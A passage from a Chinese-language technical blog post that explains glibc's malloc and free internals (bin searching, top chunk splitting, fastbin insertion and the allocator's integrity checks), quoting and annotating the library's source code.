av-&gt;binmap[block] = <span class="built_in">map</span> &amp;= ~bit; <span class="comment">/* Write through */</span></span><br><span class="line">            bin = next_bin (bin);</span><br><span class="line">            bit &lt;&lt;= <span class="number">1</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">        &#123;</span><br><span class="line">            size = chunksize (victim);</span><br><span class="line"></span><br><span class="line">            <span class="comment">/*  We know the first chunk in this bin is big enough to use. */</span></span><br><span class="line">            assert ((<span class="type">unsigned</span> <span class="type">long</span>) (size) &gt;= (<span class="type">unsigned</span> <span class="type">long</span>) (nb));</span><br><span class="line"></span><br><span class="line">            remainder_size = size - nb;</span><br><span class="line"></span><br><span class="line">            <span class="comment">/* unlink */</span></span><br><span class="line">            unlink (av, victim, bck, fwd);</span><br><span class="line"></span><br><span class="line">            <span class="comment">/* Exhaust */</span></span><br><span class="line">            <span class="keyword">if</span> (remainder_size &lt; MINSIZE)</span><br><span class="line">            &#123;</span><br><span class="line">               <span class="comment">//...与上一个代码块相同，处理不能拆分chunk的操作</span></span><br><span class="line">                set_inuse_bit_at_offset (victim, size);</span><br><span class="line">                <span class="keyword">if</span> (av != &amp;main_arena)</span><br><span class="line">                    victim-&gt;size |= NON_MAIN_ARENA;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="comment">/* Split */</span></span><br><span class="line">            <span class="keyword">else</span></span><br><span class="line">            &#123;</span><br><span class="line">                <span class="comment">//...与上一个代码块相同，处理可以拆分chunk的操作</span></span><br><span class="line">                <span class="comment">//但是在插入unsorted bin之后设置了last_remainder</span></span><br><span class="line">                remainder = chunk_at_offset (victim, nb);</span><br><span class="line"></span><br><span class="line">                <span class="comment">/* We cannot assume the unsorted list is empty and therefore</span></span><br><span class="line"><span class="comment">                         have to perform a complete insert here.  */</span></span><br><span class="line">                bck = unsorted_chunks (av);</span><br><span class="line">                fwd = bck-&gt;fd;</span><br><span class="line">                <span class="keyword">if</span> (__glibc_unlikely (fwd-&gt;bk != bck))</span><br><span class="line">                &#123;</span><br><span class="line">                    errstr = <span class="string">&quot;malloc(): corrupted unsorted chunks 2&quot;</span>;</span><br><span class="line">                    <span class="keyword">goto</span> errout;</span><br><span class="line">                &#125;</span><br><span class="line">                remainder-&gt;bk = bck;</span><br><span class="line">                remainder-&gt;fd = fwd;</span><br><span class="line">                bck-&gt;fd = remainder;</span><br><span class="line">                fwd-&gt;bk = remainder;</span><br><span class="line"></span><br><span class="line">                <span class="comment">/* advertise as last remainder */</span></span><br><span class="line">                <span class="keyword">if</span> (in_smallbin_range (nb))</span><br><span class="line">                    av-&gt;last_remainder = remainder;</span><br><span class="line">                <span class="keyword">if</span> (!in_smallbin_range (remainder_size))</span><br><span class="line">                &#123;</span><br><span class="line">                    remainder-&gt;fd_nextsize = <span class="literal">NULL</span>;</span><br><span class="line">                    remainder-&gt;bk_nextsize = <span class="literal">NULL</span>;</span><br><span class="line">                &#125;</span><br><span class="line">                set_head (victim, nb | PREV_INUSE |</span><br><span class="line">                          (av != &amp;main_arena ? NON_MAIN_ARENA : <span class="number">0</span>));</span><br><span class="line">                set_head (remainder, remainder_size | PREV_INUSE);</span><br><span class="line">                set_foot (remainder, remainder_size);</span><br><span class="line">            &#125;</span><br><span class="line">            check_malloced_chunk (av, victim, nb);</span><br><span class="line">            <span class="type">void</span> *p = chunk2mem (victim);</span><br><span class="line">            alloc_perturb (p, bytes);</span><br><span class="line">            <span class="keyword">return</span> p;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>如果对应大小的链表中不存在符合要求的<code>chunk</code>则向下一个较大的<code>large bin</code>链表中搜索符合要求的<code>chunk</code>。首先是根据<code>binmap</code>找到后方链表中存在空闲<code>chunk</code>的链表。<code>map</code>表示当前<code>idx</code>表示的<code>bin</code>在<code>binmap</code>中所在的<code>block</code>，<code>map&gt;0</code>就表示当前的<code>block</code>中存在空闲<code>chunk</code>。若<code>bit &gt; map</code>则表示当前的<code>block</code>中大于<code>bit</code>所表示的<code>bin</code>的<code>large bin</code>中不存在空闲<code>chunk</code>。那么就需要搜索下一个<code>block</code>。</p><p>找到存在空闲<code>chunk</code>的双向链表之后获取其头指针。在进行分配之前先检查了链表是否为空，防止<code>binmap</code>出错。若不为空选取其中最小的<code>chunk</code>即可以满足用户的要求，接下来就是和正常的<code>large bin</code>分配相同了。不同的是这里更新了<code>last_remainder</code>指针。</p><h4 id="top-chunk"><a href="#top-chunk" class="headerlink" title="top chunk"></a>top chunk</h4><p>如果<code>large bin</code>中不存在符合要求的<code>chunk</code>，那么就需要从<code>top chunk</code>上分配一块符合要求的<code>chunk</code>。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span> (;; )&#123;</span><br><span class="line">    <span class="comment">//处理unsorted bin，分配small bin</span></span><br><span class="line">    <span class="comment">//处理用户申请的size所对应的large bin中存在符合要求的chunk的情况</span></span><br><span class="line">    <span class="comment">//处理表示更大size的large bin链表中存在空闲chunk的情况</span></span><br><span class="line">    use_top:</span><br><span class="line">    victim = av-&gt;top;</span><br><span class="line">    size = chunksize (victim);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> ((<span class="type">unsigned</span> <span class="type">long</span>) (size) &gt;= (<span class="type">unsigned</span> <span class="type">long</span>) (nb + MINSIZE))</span><br><span class="line">    &#123;</span><br><span class="line">        remainder_size = size - nb;</span><br><span class="line">        remainder = chunk_at_offset (victim, nb);</span><br><span class="line">        av-&gt;top = remainder;</span><br><span class="line">        set_head (victim, nb | PREV_INUSE |</span><br><span class="line">                  (av != &amp;main_arena ? NON_MAIN_ARENA : <span class="number">0</span>));</span><br><span class="line">        set_head (remainder, remainder_size | PREV_INUSE);</span><br><span class="line"></span><br><span class="line">        check_malloced_chunk (av, victim, nb);</span><br><span class="line">        <span class="type">void</span> *p = chunk2mem (victim);</span><br><span class="line">        alloc_perturb (p, bytes);</span><br><span class="line">        <span class="keyword">return</span> p;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>如果当前的<code>top chunk</code>的<code>size</code>大于用户申请的<code>chunk</code>的大小，并且拆分之后的<code>chunk</code>的大小大于<code>MINSIZE</code>，即可以组成一个新的<code>chunk</code>，那么直接将<code>top chunk</code>拆分。</p><p>否则先检查<code>fastbin</code>中是否存在空闲<code>chunk</code>(其他的线程可能释放)，如果存在空闲的<code>chunk</code>，那么就合并<code>fastbin</code>，进入下一个<code>for</code>循环再次查找<code>bins</code>。</p><p>否则就调用<a href="#sysmalloc">sysmalloc</a>进一步分配内存。</p><h3 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h3><p>这里所说的用户申请的<code>size</code>包含<code>chunk</code>头部。</p><ol><li>检查是否设置了<code>malloc_hook</code>，若设置了则跳转进入<code>malloc_hook</code>（第一次调用<code>malloc</code>时设置了<code>malloc_hook</code>来实现初始化操作），若未设置则获取当前的分配区，进入<code>int_malloc</code>函数。<ol><li>如果当前的分配区为空，则调用<a href="#sysmalloc">sysmalloc</a>分配空间，返回指向新<code>chunk</code>的指针，否则进入下一步。</li><li>若用户申请的大小符合<code>fastbin</code>大小范围，若相应大小的链表不为空则返回链表头部的<code>chunk</code>，否则进入下一步。</li><li>如果用户申请的大小符合<code>small bin</code>的范围，则在相应大小的链表中寻找<code>chunk</code>，若<code>small bin</code>未初始化，则进入第<code>4</code>步，否则验证链表是否为空，若不为空将链表尾部的<code>chunk</code>分配给用户，否则进入第<code>5</code>步。</li><li>调用<a href="#malloc_consolidate">malloc_consolidate</a>函数将<code>fastbin</code>进行合并插入到<code>unsorted bin</code>链表中（通过<code>get_max_fast</code>若堆未初始化则初始化堆）。</li><li>用户申请的大小符合<code>large bin</code>或<code>small bin</code>链表为空，开始处理<code>unsorted bin</code>链表中的<code>chunk</code>。在<code>unsorted bin</code>链表中查找符合大小的<code>chunk</code>，若用户申请的大小为<code>small bin</code>，<code>unsorted bin</code>中只有一块<code>chunk</code>并指向<code>last_remainder</code>，且<code>chunk size</code>的大小大于<code>size+MINSIZE</code>(保证拆分之后的<code>remainder</code>能组成一个<code>chunk</code>)，则对当前的<code>chunk</code>进行拆分，更新分配区中的<code>last_remainder</code>。否则进入下一步。</li><li>将当前的<code>unsorted bin</code>中的<code>chunk</code>取下，若其<code>size</code>恰好为用户申请的<code>size</code>，则将<code>chunk</code>返回给用户。否则进入下一步</li><li>获取当前<code>chunk size</code>所对应的<code>bins</code>数组中的头指针。（<code>large bin</code>需要保证从大到小的顺序，因此需要遍历）将其插入到对应的链表中。如果处理的<code>chunk</code>的数量大于<code>MAX_ITERS</code>则不在处理。进入下一步。</li><li>如果用户申请的空间的大小符合<code>large bin</code>的范围或者对应的<code>small bin</code>链表为空且<code>unsorted bin</code>链表中没有符合大小的<code>chunk</code>，则在对应的<code>large bin</code>链表中查找符合条件的<code>chunk</code>（即其大小要大于用户申请的<code>size</code>）。若找到相应的<code>chunk</code>则对<code>chunk</code>进行拆分，返回符合要求的<code>chunk</code>（无法拆分时整块返回）。否则进入下一步。</li><li>根据<code>binmap</code>找到表示更大<code>size</code>的<code>large bin</code>链表，若其中存在空闲的<code>chunk</code>，则将<code>chunk</code>拆分之后返回符合要求的部分，并更新<code>last_remainder</code>。否则进入下一步。</li><li>若<code>top chunk</code>的大小大于用户申请的空间的大小，则将<code>top chunk</code>拆分，返回符合用户要求的<code>chunk</code>，并更新<code>last_remainder</code>，否则进入下一步。</li><li>若<code>fast bin</code>不为空（其他线程可能释放<code>chunk</code>），则调用<code>malloc_consolidate</code>合并<code>fastbin</code>，返回第<code>5</code>步继续执行。否则进入下一步。</li><li>调用<code>sysmalloc</code>分配空间，返回指向新<code>chunk</code>的指针。</li></ol></li><li>若<code>_int_malloc</code>函数返回的<code>chunk</code>指针为空，且当前分配区指针不为空，则再次尝试<code>_int_malloc</code></li><li>对<code>chunk</code>指针进行检查，主要检查<code>chunk</code>是否为<code>mmap</code>，且位于当前的分配区内。</li></ol><h2 id="free"><a href="#free" class="headerlink" title="free"></a>free</h2><p><code>free(void* p)</code>释放<code>p</code>指向的<code>chunk</code>指针，如果<code>p</code>是空值，则没有任何的效果。如果<code>p</code>已经被释放，那么将会触发未定义的行为。默认释放大容量内存的时候将直接交还给<code>system</code>，从而减少系统占用的空间。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span></span><br><span class="line">__libc_free (<span class="type">void</span> *mem)</span><br><span class="line">&#123;</span><br><span class="line">  mstate ar_ptr;</span><br><span class="line">  mchunkptr p;                          <span class="comment">/* chunk corresponding to mem */</span></span><br><span class="line"></span><br><span class="line">  <span class="type">void</span> (*hook) (<span class="type">void</span> *, <span class="type">const</span> <span class="type">void</span> *)</span><br><span class="line">    = atomic_forced_read (__free_hook);</span><br><span class="line">  <span class="keyword">if</span> (__builtin_expect (hook != <span class="literal">NULL</span>, <span class="number">0</span>))</span><br><span class="line">    &#123;</span><br><span class="line">      (*hook)(mem, RETURN_ADDRESS (<span class="number">0</span>));</span><br><span class="line">      <span class="keyword">return</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (mem == <span class="number">0</span>)                              <span class="comment">/* free(0) has no effect */</span></span><br><span class="line">    <span class="keyword">return</span>;</span><br><span class="line"></span><br><span class="line">  p = mem2chunk (mem);</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (chunk_is_mmapped (p))                       <span class="comment">/* release mmapped memory. */</span></span><br><span class="line">    &#123;</span><br><span class="line">      <span class="comment">/* see if the dynamic brk/mmap threshold needs adjusting */</span></span><br><span class="line">      <span class="keyword">if</span> (!mp_.no_dyn_threshold</span><br><span class="line">          &amp;&amp; p-&gt;size &gt; mp_.mmap_threshold</span><br><span class="line">          &amp;&amp; p-&gt;size &lt;= DEFAULT_MMAP_THRESHOLD_MAX)</span><br><span class="line">        &#123;</span><br><span class="line">          mp_.mmap_threshold = chunksize (p);</span><br><span class="line">          mp_.trim_threshold = <span class="number">2</span> * mp_.mmap_threshold;</span><br><span class="line">          LIBC_PROBE (memory_mallopt_free_dyn_thresholds, <span class="number">2</span>,</span><br><span class="line">                      mp_.mmap_threshold, mp_.trim_threshold);</span><br><span class="line">        &#125;</span><br><span class="line">      munmap_chunk (p);</span><br><span class="line">      <span class="keyword">return</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">  ar_ptr = arena_for_chunk (p);</span><br><span class="line">  _int_free (ar_ptr, p, <span class="number">0</span>);</span><br><span class="line">&#125;</span><br><span class="line">libc_hidden_def (__libc_free)</span><br></pre></td></tr></table></figure><p>程序首先判断<code>free_hook</code>是否被设置，如果被设置，则执行<code>free_hook</code>。如果未被设置，且需要释放的指针不为空值，则判断指针指向的<code>chunk</code>是否是<code>mmap</code>的。</p><p>如果<code>chunk</code>是由<code>mmap</code>分配的，则首先更新<code>mmap</code>分配和收缩阈值，然后调用<code>munmap_chunk</code>函数释放<code>chunk</code>。否则调用<code>_int_free</code>函数释放<code>chunk</code>。</p><h3 id="int-free"><a href="#int-free" class="headerlink" title="_int_free"></a>_int_free</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">size = chunksize (p);</span><br><span class="line"></span><br><span class="line"><span class="comment">/* Little security check which won&#x27;t hurt performance: the</span></span><br><span class="line"><span class="comment">   allocator never wrapps around at the end of the address space.</span></span><br><span class="line"><span class="comment">   Therefore we can exclude some size values which might appear</span></span><br><span class="line"><span class="comment">   here by accident or by &quot;design&quot; from some intruder.  */</span></span><br><span class="line"><span class="comment">//uintptr_t即unsigned long int</span></span><br><span class="line"><span class="keyword">if</span> (__builtin_expect ((<span class="type">uintptr_t</span>) p &gt; (<span class="type">uintptr_t</span>) -size, <span class="number">0</span>)</span><br><span class="line">    || __builtin_expect (misaligned_chunk (p), <span class="number">0</span>))</span><br><span class="line">  &#123;</span><br><span class="line">    errstr = <span class="string">&quot;free(): invalid pointer&quot;</span>;</span><br><span class="line">  errout:</span><br><span class="line">    <span class="keyword">if</span> (!have_lock &amp;&amp; locked)</span><br><span class="line">      (<span class="type">void</span>) mutex_unlock (&amp;av-&gt;mutex);</span><br><span class="line">    malloc_printerr (check_action, errstr, chunk2mem (p), av);</span><br><span class="line">    <span class="keyword">return</span>;</span><br><span class="line">  &#125;</span><br><span class="line"><span class="comment">/* We know that each chunk is at least MINSIZE bytes in size or a</span></span><br><span class="line"><span class="comment">   multiple of MALLOC_ALIGNMENT.  */</span></span><br><span class="line"><span class="keyword">if</span> (__glibc_unlikely (size &lt; MINSIZE || !aligned_OK (size)))</span><br><span class="line">  &#123;</span><br><span class="line">    errstr = <span class="string">&quot;free(): invalid size&quot;</span>;</span><br><span class="line">    <span class="keyword">goto</span> errout;</span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure><p>首先获取<code>chunk</code>的大小，然后判断传入的<code>chunk</code>指针的合法性以及<code>size</code>的合法性。如果传入的<code>size</code>和指针合法，则首先判断<code>chunk</code>是否属于<code>fastbin</code>。</p><h3 id="fastbin-1"><a href="#fastbin-1" class="headerlink" title="fastbin"></a>fastbin</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line">  <span class="keyword">if</span> ((<span class="type">unsigned</span> <span class="type">long</span>)(size) &lt;= (<span class="type">unsigned</span> <span class="type">long</span>)(get_max_fast ())</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">if</span> TRIM_FASTBINS<span class="comment">//即若与top chunk相邻，不立即与top chunk合并</span></span></span><br><span class="line">      <span class="comment">/*</span></span><br><span class="line"><span class="comment">If TRIM_FASTBINS set, don&#x27;t place chunks</span></span><br><span class="line"><span class="comment">bordering top into fastbins</span></span><br><span class="line"><span class="comment">      */</span></span><br><span class="line">      &amp;&amp; (chunk_at_offset(p, size) != av-&gt;top)</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line">      ) &#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (__builtin_expect (chunk_at_offset (p, size)-&gt;size &lt;= <span class="number">2</span> * SIZE_SZ, <span class="number">0</span>)</span><br><span class="line">|| __builtin_expect (chunksize (chunk_at_offset (p, size))</span><br><span class="line">     &gt;= av-&gt;system_mem, <span class="number">0</span>))</span><br><span class="line">      &#123;</span><br><span class="line"><span class="comment">/* We might not have a lock at this point and concurrent modifications</span></span><br><span class="line"><span class="comment">   of system_mem might have let to a false positive.  Redo the test</span></span><br><span class="line"><span class="comment">   after getting the lock.  */</span></span><br><span class="line"><span class="keyword">if</span> (have_lock</span><br><span class="line">    || (&#123; assert (locked == <span class="number">0</span>);</span><br><span class="line">  mutex_lock(&amp;av-&gt;mutex);</span><br><span class="line">  locked = <span class="number">1</span>;</span><br><span class="line">  chunk_at_offset (p, size)-&gt;size &lt;= <span class="number">2</span> * SIZE_SZ</span><br><span class="line">    || chunksize (chunk_at_offset (p, size)) &gt;= av-&gt;system_mem;</span><br><span class="line">      &#125;))</span><br><span class="line">  &#123;</span><br><span class="line">    errstr = <span class="string">&quot;free(): invalid next size (fast)&quot;</span>;</span><br><span class="line">    <span class="keyword">goto</span> errout;</span><br><span class="line">  &#125;</span><br><span class="line"><span class="keyword">if</span> (! have_lock)</span><br><span class="line">  &#123;</span><br><span class="line">    (<span class="type">void</span>)mutex_unlock(&amp;av-&gt;mutex);</span><br><span class="line">    locked = <span class="number">0</span>;</span><br><span class="line">  &#125;</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="comment">//...</span></span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure><p>接下来还是对<code>fastbin</code>的<code>size</code>进行了验证，主要是判断其大小是否小于<code>2*SIZE_SZ</code>，或者大于<code>system_mem</code>等非法值。如果<code>size</code>合法则进入下面的处理。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> ((<span class="type">unsigned</span> <span class="type">long</span>)(size) &lt;= (<span class="type">unsigned</span> <span class="type">long</span>)(get_max_fast ()<span class="comment">/*忽略 if .. endif*/</span>)&#123;</span><br><span class="line">    <span class="comment">//size合法性验证</span></span><br><span class="line">    free_perturb (chunk2mem(p), size - <span class="number">2</span> * SIZE_SZ);</span><br><span class="line"></span><br><span class="line">    set_fastchunks(av);</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">int</span> idx = fastbin_index(size);</span><br><span class="line">    fb = &amp;fastbin (av, idx);</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* Atomically link P to its fastbin: P-&gt;FD = *FB; *FB = P;  */</span></span><br><span class="line">    mchunkptr old = *fb, old2;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">int</span> old_idx = ~<span class="number">0u</span>;</span><br><span class="line">    <span class="comment">//...</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>程序首先调用<code>free_perturb</code>函数，这个函数是用来清理<code>chunk</code>中的用户数据的</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">free_perturb (<span class="type">char</span> *p, <span class="type">size_t</span> n)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">if</span> (__glibc_unlikely (perturb_byte))</span><br><span class="line">    <span class="built_in">memset</span> (p, perturb_byte, n);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>即如果设置了<code>perturb_byte</code>的值，就会将<code>chunk</code>中的用户数据设置为该值。</p><p>接下来就是将<code>malloc_state</code>中表示<code>fastbin</code>中含有空闲<code>chunk</code>的位置为<code>1</code>，并获得与释放<code>chunk</code>大小对应的<code>fast bin</code>链表的头指针。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> ((<span class="type">unsigned</span> <span class="type">long</span>)(size) &lt;= (<span class="type">unsigned</span> <span class="type">long</span>)(get_max_fast ()<span class="comment">/*忽略 if .. endif*/</span>)&#123;</span><br><span class="line">    <span class="comment">//size合法性验证</span></span><br><span class="line">    <span class="comment">//设置标志位，获取相应fast bin链表的头指针</span></span><br><span class="line">    <span class="keyword">do</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="comment">/* Check that the top of the bin is not the record we are going to add</span></span><br><span class="line"><span class="comment">           (i.e., double free).  */</span></span><br><span class="line">        <span class="keyword">if</span> (__builtin_expect (old == p, <span class="number">0</span>))</span><br><span class="line">        &#123;</span><br><span class="line">            errstr = <span class="string">&quot;double free or corruption (fasttop)&quot;</span>;</span><br><span class="line">            <span class="keyword">goto</span> errout;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">/* Check that size of fastbin chunk at the top is the same as</span></span><br><span class="line"><span class="comment">           size of the chunk that we are adding.  We can dereference OLD</span></span><br><span class="line"><span class="comment">           only if we have the lock, otherwise it might have already been</span></span><br><span class="line"><span class="comment">           deallocated.  See use of OLD_IDX below for the actual check.  */</span></span><br><span class="line">        <span class="keyword">if</span> (have_lock &amp;&amp; old != <span class="literal">NULL</span>)</span><br><span class="line">            old_idx = fastbin_index(chunksize(old));</span><br><span class="line">        p-&gt;fd = old2 = old;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">while</span> ((old = catomic_compare_and_exchange_val_rel (fb, p, old2)) != old2);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (have_lock &amp;&amp; old != <span class="literal">NULL</span> &amp;&amp; __builtin_expect (old_idx != idx, <span class="number">0</span>))</span><br><span class="line">    &#123;</span><br><span class="line">        errstr = <span class="string">&quot;invalid fastbin entry (free)&quot;</span>;</span><br><span class="line">        <span class="keyword">goto</span> errout;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>在将<code>chunk</code>插入<code>fast bin</code>链表的时候，首先判断了链表的第一个<code>chunk</code>是否与当前的<code>chunk</code>相同，即判断是否为<code>double free</code>。接下来就是通过<code>CAS</code>操作将<code>chunk</code>插入到<code>fast bin</code>链表中。</p><h3 id="unsorted-bin"><a href="#unsorted-bin" class="headerlink" title="unsorted bin"></a>unsorted bin</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> ((<span class="type">unsigned</span> <span class="type">long</span>)(size) &lt;= (<span class="type">unsigned</span> <span class="type">long</span>)(get_max_fast ()<span class="comment">/*忽略 if .. endif*/</span>)&#123;</span><br><span class="line">    <span class="comment">//处理size大小小于最大fast bin限制的chunk，将其插入到fast bin链表中</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span> <span class="keyword">if</span> (!chunk_is_mmapped(p)) &#123;</span><br><span class="line">    <span class="keyword">if</span> (! have_lock) &#123;</span><br><span class="line">        (<span class="type">void</span>)mutex_lock(&amp;av-&gt;mutex);</span><br><span class="line">        locked = <span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    nextchunk = chunk_at_offset(p, size);</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* Lightweight tests: check whether the block is already the</span></span><br><span class="line"><span class="comment">       top block.  */</span></span><br><span class="line">    <span class="keyword">if</span> (__glibc_unlikely (p == av-&gt;top))</span><br><span class="line">    &#123;</span><br><span class="line">        errstr = <span class="string">&quot;double free or corruption (top)&quot;</span>;</span><br><span class="line">        <span class="keyword">goto</span> errout;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">/* Or whether the next chunk is beyond the boundaries of the arena.  */</span></span><br><span class="line">    <span class="keyword">if</span> (__builtin_expect (contiguous (av)</span><br><span class="line">  &amp;&amp; (<span class="type">char</span> *) nextchunk</span><br><span class="line">  &gt;= ((<span class="type">char</span> *) av-&gt;top + chunksize(av-&gt;top)), <span class="number">0</span>))</span><br><span class="line">      &#123;</span><br><span class="line">errstr = <span class="string">&quot;double free or corruption (out)&quot;</span>;</span><br><span class="line"><span class="keyword">goto</span> errout;</span><br><span class="line">      &#125;</span><br><span class="line">    <span class="comment">/* Or whether the block is actually not marked used.  */</span></span><br><span class="line">    <span class="keyword">if</span> (__glibc_unlikely (!prev_inuse(nextchunk)))</span><br><span class="line">      &#123;</span><br><span class="line">errstr = <span class="string">&quot;double free or corruption (!prev)&quot;</span>;</span><br><span class="line"><span class="keyword">goto</span> errout;</span><br><span class="line">      &#125;</span><br><span class="line"></span><br><span class="line">    nextsize = chunksize(nextchunk);</span><br><span class="line">    <span class="keyword">if</span> (__builtin_expect (nextchunk-&gt;size &lt;= <span class="number">2</span> * SIZE_SZ, <span class="number">0</span>)</span><br><span class="line">|| __builtin_expect (nextsize &gt;= av-&gt;system_mem, <span class="number">0</span>))</span><br><span class="line">      &#123;</span><br><span class="line">errstr = <span class="string">&quot;free(): invalid next size (normal)&quot;</span>;</span><br><span class="line"><span class="keyword">goto</span> errout;</span><br><span class="line">      &#125;</span><br><span class="line">    <span class="comment">//...</span></span><br><span 